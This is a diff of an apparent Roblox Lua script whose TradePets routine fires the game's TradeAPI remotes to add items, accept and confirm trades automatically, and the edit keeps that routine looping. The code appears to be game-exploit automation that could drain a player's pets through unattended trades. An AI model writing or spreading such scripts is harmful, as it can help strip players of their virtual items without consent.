@@ -262,9 +262,8 @@ while true do
             end
         end
     end
-    wait(1)
-end
 wait()
+end
 end
 spawn(PetData)
 
@@ -296,6 +295,7 @@ local function TradePets()
                 if tradeApp:FindFirstChild("Frame") then
                     local frame = tradeApp.Frame
                     if frame.Visible == true then
+wait(5)
                         while #processedFrames > 0 do
                             local args = {
                                 [1] = processedFrames[1]
@@ -308,7 +308,7 @@ local function TradePets()
                         game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
                         wait(10)
                         game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
-                        break
+                        
                     end
                 end
             end
